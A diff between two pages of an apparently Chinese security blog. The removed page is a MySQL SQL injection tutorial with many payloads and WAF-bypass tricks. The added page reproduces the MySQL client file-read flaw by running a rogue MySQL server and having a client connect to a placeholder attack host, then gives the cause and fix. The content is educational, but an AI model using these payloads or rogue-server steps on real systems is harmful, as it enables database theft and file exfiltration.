@@ -6,22 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>深入理解SQL注入及注入Tricks-MySQL | 不知名网络安全选手的博客</title>
+  <title>MySQL任意文件读取漏洞复现 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="深入理解SQL注入，并介绍MySQL相关的注入手法">
+  <meta name="description" content="MySQL任意文件读取漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解SQL注入及注入Tricks-MySQL">
-<meta property="og:url" content="https://yd0ng.github.io/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/index.html">
+<meta property="og:title" content="MySQL任意文件读取漏洞复现">
+<meta property="og:url" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
-<meta property="og:description" content="深入理解SQL注入，并介绍MySQL相关的注入手法">
+<meta property="og:description" content="MySQL任意文件读取漏洞复现">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yd0ng.github.io/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/1.png">
-<meta property="article:published_time" content="2020-09-08T02:10:49.000Z">
-<meta property="article:modified_time" content="2020-09-08T14:26:03.291Z">
+<meta property="og:image" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png">
+<meta property="article:published_time" content="2020-09-08T14:40:56.000Z">
+<meta property="article:modified_time" content="2020-09-08T14:47:39.361Z">
 <meta property="article:author" content="yd0ng">
-<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yd0ng.github.io/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/1.png">
+<meta name="twitter:image" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -137,213 +137,41 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-深入理解SQL注入及注入Tricks-MySQL" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-MySQL任意文件读取漏洞复现" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      深入理解SQL注入及注入Tricks-MySQL
+      MySQL任意文件读取漏洞复现
     </h1>
   
 
         
-        <a href="/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/" class="archive-article-date">
-  	<time datetime="2020-09-08T02:10:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-08</time>
+        <a href="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+  	<time datetime="2020-09-08T14:40:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>深入理解SQL注入，并介绍MySQL相关的注入手法</p>
+        <p>MySQL任意文件读取漏洞复现</p>
 <a id="more"></a>
 
-<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>老生常谈的话题，存在数据交互的地方，系统将攻击者精心构造的payload带入数据库进行查询，从而获得账号密码等信息</p>
-<h1 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h1><p>分类从来没有一个明确的标准，但大概可按照以下类型分类:</p>
-<ul>
-<li>按照数据类型，分为字符型注入、数字型注入和搜索型注入</li>
-<li>按照注入方式，分为联合注入、报错注入、堆叠注入、宽字节注入、盲注、约束攻击</li>
-<li>按照注入危害类型，分为一次注入与二次注入</li>
-<li>按照注入位置，分为GET型注入、POST型注入、HTTP参数注入</li>
-<li>按照注入内容，分为正常数据注入、base64注入等</li>
-</ul>
-<h1 id="常规SQL注入思路"><a href="#常规SQL注入思路" class="headerlink" title="常规SQL注入思路"></a>常规SQL注入思路</h1><p>具体的情况具体分析，但大概可以按照以下思路</p>
-<h2 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h2><ol>
-<li>确定存在注入</li>
-<li>确定注入类型及语句闭合方式</li>
-<li>确定字段数和显示位</li>
-<li>查询数据库</li>
-<li>查询表名</li>
-<li>查询字段名</li>
-<li>查询数据</li>
-</ol>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注的工作量是比较大的，建议结合sqlmap或者python脚本来进行</p>
-<ol>
-<li>确定存在注入</li>
-<li>确定注入类型和语句闭合方式</li>
-<li>确定数据库个数、各个库名长度、查询数据库名</li>
-<li>确定表个数、各个表名长度、查询表名</li>
-<li>确定字段个数、各个字段名长度、查询字段名</li>
-<li>确定特定字段数据个数、各个数据长度、查询数据</li>
-</ol>
-<h1 id="细分SQL攻击方式"><a href="#细分SQL攻击方式" class="headerlink" title="细分SQL攻击方式"></a>细分SQL攻击方式</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><ul>
-<li>通过加单引号或者双引号或者括号等使SQL语句报错</li>
-<li>探测如何使语句注释或者闭合</li>
-<li>通过order by 语句或者直接union 1,2,3,4来判断列数和显示位</li>
-</ul>
-<p>查询数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
-<p>查询表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
-<p>查询字段名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
-<p>查询数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(username,0x3a,password) from users</span><br></pre></td></tr></table></figure>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>攻击机伪造mysql服务器并启动服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;allyshka&#x2F;Rogue-MySql-Server</span><br><span class="line">cd Rogue-MySql-Server</span><br><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure>
 
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入的本质是借助于MySQL函数报错，常用报错函数如下，payload同联合查询，不再赘述</p>
-<p>floor()+group by 报错，分组插入出现重复报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+<h2 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h2><p>客户机连接攻击机并允许load操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p -h attack_host --enable-local-infile</span><br></pre></td></tr></table></figure>
 
-<p>updatexml()报错，传入非xml格式报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,(version()),0x7e),0)</span><br></pre></td></tr></table></figure>
-
-<p>extractvalue()报错，传入非xml格式报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select database())))</span><br></pre></td></tr></table></figure>
-
-<p>exp()报错，double数据溢出报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
-<p>NAME_CONST()报错，查询重复报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select NAME_CONST(version(),1),NAME_CONST(version(),1))a;</span><br></pre></td></tr></table></figure>
-<p>BIGINT溢出错误，整数溢出报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select ~!(select * from(select user())x)+2;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>当MySQL使用gbk编码时，会认为两个字符是一个汉字，产生宽字节注入，第一个字节要大于128</p>
-<ul>
-<li>ASCII编码的范围是0-127</li>
-<li>国际通用UTF-8编码</li>
-<li>中文常用GBK编码</li>
-<li>URL编码(常见的如%20、%27、%23、%5C)</li>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png" alt></p>
+<h1 id="漏洞成因及修补方式"><a href="#漏洞成因及修补方式" class="headerlink" title="漏洞成因及修补方式"></a>漏洞成因及修补方式</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><ul>
+<li>客户端开启了load data，允许读取文件</li>
 </ul>
-<p>攻击思路大概和普通注入一致，只需要使得单引号逃逸掉反斜杠的逃逸即可，攻击思路如下</p>
-<ol>
-<li>\前加一个\，形成\‘,单引号就可以生效</li>
-<li>弄没转义的\ -&gt; 宽字节注入，原理如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\&#39; -&gt; \\&#39; -&gt;\%27</span><br><span class="line">%df&#39; -&gt; %df\&#39; -&gt; $df%5C%27</span><br></pre></td></tr></table></figure>
-例题：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php</a></li>
-</ol>
-<h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>原因：</p>
-<ul>
-<li>mysql在进行查询时会自动忽略空格</li>
-<li>长度有限制，大于长度会自动截断</li>
-<li>借助截断和自动忽略实现再注册</li>
-</ul>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入的本质是可以多语句执行，可以直接分号结束前一语句并执行攻击payload；</p>
-<h2 id="Prepare注入"><a href="#Prepare注入" class="headerlink" title="Prepare注入"></a>Prepare注入</h2><p>这个通常可以结合堆叠注入来进行攻击，也具备较好的waf绕过的效果，Prepare即先将要攻击的payload赋值给变量，然后直接通过exec执行，payload可以为字符串，也可以转换为16进制进行waf绕过，参考如下攻击代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @payload&#x3D;&quot;select user()&quot;;</span><br><span class="line">prepare execsql from @payload;</span><br><span class="line">execute execsql;</span><br></pre></td></tr></table></figure>
-
-<h2 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h2><p>类似以下这种查询语句，通过注入恶意数据可以注释中间语句，达到恶意攻击效果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>$username为admin’/*</li>
-<li>$password=*/ or ‘1<br>语句即为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin&#39;&#x2F;*&#39; and password&#x3D;&#39;*&#x2F; or &#39;1&#39;;</span><br></pre></td></tr></table></figure>
-查询结果如下，仍然可以造成攻击。<br><img src="/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/1.png" alt></li>
-</ul>
-<h2 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h2><h3 id="条件查询语句"><a href="#条件查询语句" class="headerlink" title="条件查询语句"></a>条件查询语句</h3><p>if条件语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(condition,true,false)</span><br></pre></td></tr></table></figure>
-<p>case when条件语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when condition then dosomething else dosomething end;</span><br></pre></td></tr></table></figure>
-<h3 id="截断及字符数值转化语句"><a href="#截断及字符数值转化语句" class="headerlink" title="截断及字符数值转化语句"></a>截断及字符数值转化语句</h3><p>substr()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(str,pos&#x3D;1,len)</span><br></pre></td></tr></table></figure>
-<p>substring()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substring(str,pos,[len])</span><br><span class="line">substring(str from pos for len)</span><br></pre></td></tr></table></figure>
-<p>mid()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(str,pos,len)</span><br></pre></td></tr></table></figure>
-<p>ascii()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(char)</span><br></pre></td></tr></table></figure>
-<h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><p>sleep()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(3);</span><br></pre></td></tr></table></figure>
-<p>benchmark();</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure>
-<p>笛卡尔积延时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.columns A,</span><br><span class="line">information_schema.columns B,</span><br><span class="line">information_schema.tables C;</span><br></pre></td></tr></table></figure>
-
-<p>正则回溯延时(类似dos)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span><br></pre></td></tr></table></figure>
-
-<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>其实也是在order by 之后的参数进行类似盲注的攻击手法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by if(length(database())&#x3D;8,sleep(1),1);</span><br></pre></td></tr></table></figure>
-
-<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>union带数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>
-<p>别名带数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select c from (select 1,2,3 as c union select * from users)b;</span><br></pre></td></tr></table></figure>
-<p>join带数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users union all select * from (select * from users as a join users b)c;</span><br><span class="line">select * from users union all select * from (select * from users as a join users b using(id))c;</span><br></pre></td></tr></table></figure>
-<h2 id="无逗号注入"><a href="#无逗号注入" class="headerlink" title="无逗号注入"></a>无逗号注入</h2><p>以别名+join替换的方式过逗号waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;)C);</span><br></pre></td></tr></table></figure>
-
-<h2 id="DNS外带注入"><a href="#DNS外带注入" class="headerlink" title="DNS外带注入"></a>DNS外带注入</h2><p>无任何回显且盲注无效，机器为windows机器，可考虑借助dnslog将数据进行dns外带处理。</p>
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>以上所讲的注入攻击都是在注入时直接生效，但二次注入并非如此，二次注入是将恶意的攻击数据代入数据库，再进行查询时从而造成二次攻击间接影响，比如我们注册了一个叫做admin’#的用户，代入查询时便会直接注释掉后续语句，等同于admin用户，这就是所谓的二次注入。</p>
-<h1 id="SQL注入WAF绕过技术"><a href="#SQL注入WAF绕过技术" class="headerlink" title="SQL注入WAF绕过技术"></a>SQL注入WAF绕过技术</h1><h2 id="关键词waf"><a href="#关键词waf" class="headerlink" title="关键词waf"></a>关键词waf</h2><ul>
-<li>大小写</li>
-<li>双写</li>
-<li>编码</li>
-<li>内联注释/!(version)payload*/</li>
-<li>函数替换</li>
-<li>十六进制</li>
-</ul>
-<h2 id="空格waf"><a href="#空格waf" class="headerlink" title="空格waf"></a>空格waf</h2><ul>
-<li>/**/</li>
-<li>内联注释/!payload*/</li>
-<li>%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>反引号``</li>
-</ul>
-<h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><ul>
-<li>十六进制</li>
-<li>prepare注入</li>
-<li>宽字节</li>
-</ul>
-<h2 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h2><ul>
-<li>函数重载参数列表</li>
-<li>无逗号注入</li>
-<li>join绕过逗号注入</li>
-</ul>
-<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><ul>
-<li>无列名注入</li>
-<li>大小写绕过</li>
-<li>||、|</li>
-</ul>
-<h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><ul>
-<li>&amp;&amp;、&amp;(GET时注意会被误认为在传参)</li>
-<li>^、~、+、-、*、/等运算</li>
-</ul>
-<h2 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h2><ul>
-<li>like</li>
-<li>rlike</li>
-<li>regexp</li>
-<li>!&lt;&gt;</li>
-</ul>
-<h1 id="SQL文件操作"><a href="#SQL文件操作" class="headerlink" title="SQL文件操作"></a>SQL文件操作</h1><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>加载文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(filepath);</span><br></pre></td></tr></table></figure>
-<h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 into outfile(filepath);</span><br></pre></td></tr></table></figure>
-<h2 id="load-data"><a href="#load-data" class="headerlink" title="load data"></a>load data</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile filepath into table tablename</span><br></pre></td></tr></table></figure>
-
-<h1 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h1><ul>
-<li>sql_mode可改变现有的运算符用法</li>
-<li>select被过滤可以尝试用handler读取（参考题目随便注）</li>
-<li>Mysql任意文件读取漏洞</li>
-<li>尝试十六进制绕过</li>
-<li>‘ctf’ -&gt;0xhex(ctf)</li>
-<li>#-&gt;%23 或者使用 –+</li>
-<li>=被过滤，like/regexp/!!=/!&lt;&gt;</li>
-<li>盲注引号waf,ascii()变数字</li>
-<li>substring(str from pos for len) 绕过逗号waf</li>
-<li>rlike/regexp ‘正则’ 爆破数据</li>
-<li>or 被waf用||</li>
-<li>空格被waf用/**/、反引号</li>
-<li>\N=NULL，可忽略空格</li>
+<h2 id="修补方式"><a href="#修补方式" class="headerlink" title="修补方式"></a>修补方式</h2><ul>
+<li>禁用load读取文件</li>
 </ul>
 
       
@@ -392,7 +220,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		
 		</ul>
@@ -448,7 +276,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -462,18 +290,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          MySQL任意文件读取漏洞复现
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/09/07/SQLMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E5%8F%8Atamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SQLMAP高级使用及tamper脚本编写</div>
+    <a href="/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">深入理解SQL注入及注入Tricks-MySQL</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -500,7 +319,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入介绍"><span class="toc-number">1.</span> <span class="toc-text">SQL注入介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入分类"><span class="toc-number">2.</span> <span class="toc-text">SQL注入分类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常规SQL注入思路"><span class="toc-number">3.</span> <span class="toc-text">常规SQL注入思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#普通注入"><span class="toc-number">3.1.</span> <span class="toc-text">普通注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">3.2.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#细分SQL攻击方式"><span class="toc-number">4.</span> <span class="toc-text">细分SQL攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#联合查询"><span class="toc-number">4.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">4.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">4.3.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL约束攻击"><span class="toc-number">4.4.</span> <span class="toc-text">SQL约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆叠注入"><span class="toc-number">4.5.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prepare注入"><span class="toc-number">4.6.</span> <span class="toc-text">Prepare注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP分割注入"><span class="toc-number">4.7.</span> <span class="toc-text">HTTP分割注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注-1"><span class="toc-number">4.8.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#条件查询语句"><span class="toc-number">4.8.1.</span> <span class="toc-text">条件查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#截断及字符数值转化语句"><span class="toc-number">4.8.2.</span> <span class="toc-text">截断及字符数值转化语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#延时函数"><span class="toc-number">4.8.3.</span> <span class="toc-text">延时函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by注入"><span class="toc-number">4.9.</span> <span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无列名注入"><span class="toc-number">4.10.</span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无逗号注入"><span class="toc-number">4.11.</span> <span class="toc-text">无逗号注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS外带注入"><span class="toc-number">4.12.</span> <span class="toc-text">DNS外带注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次注入"><span class="toc-number">4.13.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入WAF绕过技术"><span class="toc-number">5.</span> <span class="toc-text">SQL注入WAF绕过技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#关键词waf"><span class="toc-number">5.1.</span> <span class="toc-text">关键词waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#空格waf"><span class="toc-number">5.2.</span> 